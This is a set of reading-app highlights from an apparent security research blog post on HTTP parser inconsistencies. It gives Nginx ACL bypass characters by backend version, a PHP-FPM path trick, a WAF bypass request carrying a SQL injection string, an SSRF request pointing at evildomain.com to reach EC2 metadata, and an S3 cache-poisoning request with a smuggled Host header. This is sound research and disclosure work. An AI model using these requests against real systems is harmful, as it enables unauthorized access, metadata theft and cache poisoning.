---
author: "Rafael da Costa Santos"
aliases: ["Exploiting HTTP Parsers Inconsistencies"]
tags: [RW_inbox, readwise/articles]
url: https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies
date: 2025-01-09
---
# Exploiting HTTP Parsers Inconsistencies

![rw-book-cover](https://hashnode.com/utility/r?url=https%3A%2F%2Fcdn.hashnode.com%2Fres%2Fhashnode%2Fimage%2Fupload%2Fv1687022613860%2F91867fcc-2a19-4dfb-8fd5-5758b016ad37.avif%3Fw%3D1200%26auto%3Dcompress%2Cformat%26format%3Dwebp%26fm%3Dpng)

## Highlights


the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.
> [View Highlight](https://read.readwise.io/read/01jh56ycw6wgxjena5vs94mqte)



n this research, my focus revolves around the discovery of inconsistencies within HTTP parsers across various web technologies, including load balancers, reverse proxies, web servers, and caching servers. By investigating these disparities, I aim to shed light on potential new vulnerabilities that involve HTTP Desync attacks.
> [View Highlight](https://read.readwise.io/read/01jh56yyxvthjar40gwsb4agyw)



Pathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules
 This section of the research focuses on the exploitable vulnerabilities arising from pathname manipulation in web servers, principally about the use of `trim()` or `strip()` functions. By exploiting these techniques, attackers can circumvent security rules specific to certain paths in reverse proxies and load balancers, posing a significant threat to web application security.
> [View Highlight](https://read.readwise.io/read/01jh58p2z0yp2gzk7cpga1jkmn)



Nginx ACL Rules
> [View Highlight](https://read.readwise.io/read/01jh58pbde5ftbx91p2r6xzey4)



location = /admin {
 deny all;
 }
 location = /admin/ {
 deny all;
 }
> [View Highlight](https://read.readwise.io/read/01jh58pztjaj05bft8mh13a6h4)



To prevent security issues on URI-based rules, Nginx performs path normalization before checking them. Path normalization in Nginx refers to the process of transforming and standardizing requested URLs to a consistent and canonical format before handling them. It involves removing redundant or unnecessary elements from the URL path, such as extra slashes, dot segments, processing path traversal, and URL-encoded characters, to ensure uniformity and proper routing within the web server.
> [View Highlight](https://read.readwise.io/read/01jh58qa11ss1bg6q162ascn8e)



Trim Inconsistencies
 Before we proceed, we need to understand what the `trim()` function does in different languages.
> [View Highlight](https://read.readwise.io/read/01jh58qm6333e8jdcde1mnr8h8)



Different languages remove different characters when the correspondent function for `trim()` is called. Each server will normalize the pathname based on its `trim()`, removing different characters.
> [View Highlight](https://read.readwise.io/read/01jh58qyr78v54e5d3scw942ww)



E.g.: Python removes the character `\x85` with `strip()`, and JavaScript does not with `trim()`.
> [View Highlight](https://read.readwise.io/read/01jh58rq7c2g6s76nvddqwry9z)



Bypassing Nginx ACL Rules With Node.js
> [View Highlight](https://read.readwise.io/read/01jh58spxfsnch8xjckptfvqzj)



app.get('/admin', (req, res) => { return res.send('ADMIN'); });
> [View Highlight](https://read.readwise.io/read/01jh58st3mtn6j0e52dp1y39v1)



Following the `trim()` logic, Node.js "ignores" the characters `\x09`, `\xa0`, and `\x0c` from the pathname, but Nginx considers them as part of the URL:
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686751453300/0531fc1a-9599-4a00-aa94-21cca2db557c.png?auto=compress,format&format=webp)
> [View Highlight](https://read.readwise.io/read/01jh58t4t87cx6hf4m0s2kj8z7)



![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686752151660/84ec1c49-2df9-4a44-ab01-1d798ef0564f.png?auto=compress,format&format=webp)
> [View Highlight](https://read.readwise.io/read/01jh58vt4gxe925n0893acg5p7)



Below is a table correlating Nginx versions with characters that can potentially lead to bypassing URI ACL rules when using Node.js as the backend:
 Nginx Version
 **Node.js Bypass Characters**
 1.22.0
 `\xA0`
 1.21.6
 `\xA0`
 1.20.2
 `\xA0`, `\x09`, `\x0C`
 1.18.0
 `\xA0`, `\x09`, `\x0C`
 1.16.1
 `\xA0`, `\x09`, `\x0C`
 [Permalink](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies/#heading-bypassing-nginx-acl-rules-with-flask)
> [View Highlight](https://read.readwise.io/read/01jh58wfe57j4q6aj1jzrmj1z6)



Bypassing Nginx ACL Rules With Flask
 Flask removes the characters `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`, and `\x09` from the URL path, but NGINX doesn't.
> [View Highlight](https://read.readwise.io/read/01jh58wvvdnagn0dkv8xtf0t2j)



t's possible to circumvent the ACL protection by adding the character `\x85` at the end of the pathname:
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686753386536/4032be9b-c7f3-48ae-8074-5d9ad1f9e7a5.png?auto=compress,format&format=webp)
 Nginx Version
 **Flask Bypass Characters**
 1.22.0
 `\x85`, `\xA0`
 1.21.6
 `\x85`, `\xA0`
 1.20.2
 `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`
 1.18.0
 `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`
 1.16.1
 `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`
 [Permalink](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies/#heading-bypassing-nginx-acl-rules-with-spring-boot)
> [View Highlight](https://read.readwise.io/read/01jh58xramjmm0p8c4p8a0tnsr)



Bypassing Nginx ACL Rules With Spring Boot
 Spring removes the characters `\x09` and `\x3B` from the URL path, but Nginx doesn't.
> [View Highlight](https://read.readwise.io/read/01jh58y09ymafjc1v9584s3449)



ACL protection can be circumvented by adding the character `\x09` or `\t` at the end of the pathname:
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686753921718/b3f91ea3-558f-4889-860c-15cdc02cb7f6.png?auto=compress,format&format=webp)
 Nginx Version
 **Spring Boot Bypass Characters**
 1.22.0
 `;`
 1.21.6
 `;`
 1.20.2
 `\x09`, `;`
 1.18.0
 `\x09`, `;`
 1.16.1
 `\x09`, `;`
 [Permalink](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies/#heading-bypassing-nginx-acl-rules-with-php-fpm-integration)
> [View Highlight](https://read.readwise.io/read/01jh58ygca92njv5y51cpk2bwp)



Bypassing Nginx ACL Rules With PHP-FPM Integration
> [View Highlight](https://read.readwise.io/read/01jh591de2dhv3w7b9frarrvsp)



location = /admin.php { deny all; } location ~ \.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php8.1-fpm.sock; }
> [View Highlight](https://read.readwise.io/read/01jh591h81ag9xxsasdaxfabeq)



When two `.php` files are in the same pathname of the HTTP request, PHP will match the first one, ignoring everything after the slash. Since the Nginx is configured to block requests to the specific endpoint `/admin.php`, it's possible to access the admin.php file by doing the following request:
> [View Highlight](https://read.readwise.io/read/01jh5924dbg63ncbp60pp3f93w)



![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686758750001/66ac562a-7da9-4397-a76a-1d641474e000.png?auto=compress,format&format=webp)
> [View Highlight](https://read.readwise.io/read/01jh592awxpkreayqf0z8rdkrf)



![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686758967146/03073365-9dbf-4cf5-8762-1d705c9a038c.png?auto=compress,format&format=webp)
> [View Highlight](https://read.readwise.io/read/01jh592dmxm0kayn3mhwe8bydd)



This technique only works if the second PHP file, in this case, `index.php`, exists in the server structure.
> [View Highlight](https://read.readwise.io/read/01jh592t5zeg3e1thsahgvshqy)



How to prevent
 To prevent these issues, you must use the `~` expression Instead of the `=` expression on Nginx ACL rules, for example:
 Copy
 Copy
 location ~* ^/admin {
 deny all;
 }
> [View Highlight](https://read.readwise.io/read/01jh5942zds7p2r9sqa6xqc7a5)



Bypassing AWS WAF ACL With Line Folding
 Web servers like Node.js, Flask and many others sometimes encounter a phenomenon known as "line folding." Line folding refers to the practice of splitting long header values using the characters \x09 (tab) and \x20 (space) into multiple lines for readability.
> [View Highlight](https://read.readwise.io/read/01jh596knhpc9tp1s6kw5e0nms)



For example, the header `1337: Value\r\n\t1337` in the following request will be interpreted as `1337: Value\t1337` in the Node.js server:
 Copy
 Copy
 GET / HTTP/1.1
 Host: target.com
 1337: Value
 1337
 Connection: close
> [View Highlight](https://read.readwise.io/read/01jh5972zmz2qkfkvnhh2q8k43)



![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686765599948/440f51b0-18bb-451c-92da-3428000cd7f0.png?auto=compress,format&format=webp)
> [View Highlight](https://read.readwise.io/read/01jh599zddzrgk40v666cggz81)



Below is an example of an exploitation request:
 Copy
 Copy
 GET / HTTP/1.1\r\n
 Host: target.com\r\n
 X-Query: Value\r\n
 \t' or '1'='1' -- \r\n
 Connection: close\r\n
 \r\n
> [View Highlight](https://read.readwise.io/read/01jh59akzdfx46bdkghg8yqv06)



![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686765362775/dbd69c56-503e-45bb-ada6-358d3d987ede.png?auto=compress,format&format=webp)
> [View Highlight](https://read.readwise.io/read/01jh59bp0p2h47cjmxx2xc9w4b)



SSRF on Flask Through Incorrect Pathname Interpretation
> [View Highlight](https://read.readwise.io/read/01jh59f7xk7qzt8480sm1nzbwe)



GET @/ HTTP/1.1 Host: target.com Connection: close
> [View Highlight](https://read.readwise.io/read/01jh59fb78bg4hgy3b8cyr1wp2)



Please consider the following source code as a reference for the exploitation scenario:
 Copy
 Copy
 from flask import Flask
 from requests import get
 app = Flask('__main__')
 SITE_NAME = 'https://google.com'
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
 def proxy(path):
 return get(f'{SITE_NAME}{path}').content
 if __name__ == "__main__":
 app.run(threaded=False)
 Presented below is an example of an exploitation request:
 Copy
 Copy
 GET @evildomain.com/ HTTP/1.1
 Host: target.com
 Connection: close
 In the following example, I was able to fetch my EC2 metadata:
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686771183056/fe166abf-b2cb-41be-846b-11ac56b33d71.png?auto=compress,format&format=webp)
 [Permalink](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies/#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation)
> [View Highlight](https://read.readwise.io/read/01jh59g346xx6n0jhbpfvkjxn3)



HTTP Desync Cache Poisoning Attacks
 Inconsistencies exist among servers and reverse proxies when it comes to removing invalid invisible characters from header names before interpreting them. This inconsistency can lead to notable vulnerabilities, such as HTTP Request Smuggling.
> [View Highlight](https://read.readwise.io/read/01jh59kg5xwe9wwtf4yn1v75yk)



S3 HTTP Desync Cache Poisoning Issue
 In this section, I will demonstrate an HTTP Desync vulnerability that can result in Cache Poisoning, impacting principally AWS S3 buckets.
> [View Highlight](https://read.readwise.io/read/01jh59m6n9a7w5ch106yva6qj6)



The interpretation of host headers for S3 buckets involves two key aspects:
 1. When multiple host headers are included in the request, only the first one will be taken, and any additional headers will be ignored.
 2. The following bytes are ignored if present in the header name: `\x1f`, `\x1d`, `\x0c`, `\x1e`, `\x1c`, `\x0b`;
 The vulnerability arises from an inconsistency in the host header interpretation. If the cache server mistakenly includes the ignored bytes as part of the header name, treating it as an invalid host header, while S3 interprets it as a valid host header, it becomes possible to cache arbitrary bucket responses on vulnerable websites.
> [View Highlight](https://read.readwise.io/read/01jh59nesm2pczvtwqys2xpy9s)



GET / HTTP/1.1
 [\x1d]Host: evilbucket.com
 Host: example.bucket.com
 Connection: close
 • First, the cache server examines the header `\x1dHost: evilbucket.com` and treats it like any other unkeyed header;
 • Subsequently, the cache server will correctly interpret the `example.bucket.com` header as a valid host header, resulting in the final cache response being associated with this host value.
 • Upon reaching the S3 bucket, the header `\x1dHost: evilbucket.com` will be mistakenly interpreted as a valid host header, while the intended `Host: example.bucket.com` header will be ignored. This misinterpretation by AWS will lead to the fetching of the malicious header's associated bucket.
 The final result is a complete cache poisoning of the page with arbitrary content.
> [View Highlight](https://read.readwise.io/read/01jh59rw2n9seq5s58s8s09twe)

